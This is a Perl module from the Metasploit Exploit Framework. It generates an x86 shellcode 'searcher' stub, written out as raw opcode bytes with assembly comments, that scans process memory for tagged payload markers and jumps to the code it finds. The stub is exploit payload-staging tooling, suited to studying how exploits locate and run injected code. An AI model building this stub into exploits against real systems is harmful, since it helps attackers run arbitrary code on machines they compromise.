
###############

##
#         Name: Searcher.pm
#       Author: spoonm <ninjatools [at] hush.com>
#      Version: $Revision$
#      License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
##

package Pex::Searcher;
use strict;

sub new {
  my $class = shift;
  return(bless(
    {
      'EndTag' => shift,
    }, $class));
}

sub StartTag {
  my $self = shift;
  return(pack('V', unpack('V', $self->EndTag) + 1));
}

sub EndTag {
  my $self = shift;
  $self->{'EndTag'} = shift if(@_);
  return($self->{'EndTag'});
}

sub StoredTag {
  my $self = shift;
  return(pack('V', unpack('V', $self->EndTag) - 1));
}

# Address to start scanning at in edi
sub Searcher {
  my $self = shift;
  my $search = "\xbe" . $self->StoredTag.   # mov esi, EndTag - 1
               "\x46".                      # inc esi
               "\x47".                      # inc edi (end_search:)
               "\x39\x37".                  # cmp [edi],esi
               "\x75\xfb".                  # jnz 0xa (end_search)
               "\x46".                      # inc esi
               "\x4f".                      # dec edi (start_search:)
               "\x39\x77\xfc".              # cmp [edi-0x4],esi
               "\x75\xfa".                  # jnz 0x10 (start_search)
               "\xff\xe7";                  # jmp edi

  return($search);
}

1;
